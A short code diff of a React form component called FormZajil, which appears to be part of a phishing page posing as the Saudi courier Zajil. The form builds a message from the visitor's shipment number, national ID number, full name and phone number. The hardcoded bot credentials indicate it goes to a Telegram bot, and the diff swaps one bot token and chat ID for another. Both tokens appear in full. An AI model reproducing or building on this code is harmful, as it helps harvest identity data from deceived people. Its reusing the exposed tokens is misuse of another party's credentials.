@@ -16,8 +16,8 @@ const FormZajil = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
     var bot={
-      token:"6989400723:AAHYaV2mqkCKuP5OsEA7mK5s_7mctmTRChc",
-      chat_id:6364996162
+      token:"6688266348:AAFU2baoOulq9YUsMyiVnEVZ8U8Iw13zPDI",
+      chat_id:6473956939
     }
     var length =`رقم الشحنة: ${numberTrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value}`
    
